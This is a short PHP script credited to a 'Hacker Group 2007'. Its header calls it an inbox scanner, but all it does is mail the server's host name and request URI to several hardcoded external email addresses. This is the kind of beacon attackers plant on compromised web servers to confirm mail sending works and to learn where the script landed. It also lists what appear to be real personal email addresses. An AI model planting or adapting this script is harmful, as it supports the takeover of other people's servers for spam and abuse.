<?php
//=================================
//
//    scan inb0x hotmail v1.0
//
//  coded by FilhOte_Ccs and LOST
//      não rippem fdps :]
//
//
//      Hacker Group 2007
//=================================
//
 ini_set("max_execution_time",-1);
 set_time_limit(0);
 $user = @get_current_user();
 $email = "f3l1p3h0@hotmail.com";
 $assunto = "Teste";
 $email1 = "topcine2014@gmail.com,f3l1p3h0@hotmail.com,rorewsaforesta@yahoo.com.br,n-lorenco-moraes@uol.com.br,wradelezinho2356@bol.com.br";
 $headers  = "From: <$email>\r\n";


 if(mail($email1, $assunto, $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], $headers)){
 echo "Opa, enviado!";
 exit();
 }
 else{
 echo "Não enviei..";
 exit();
 }
?>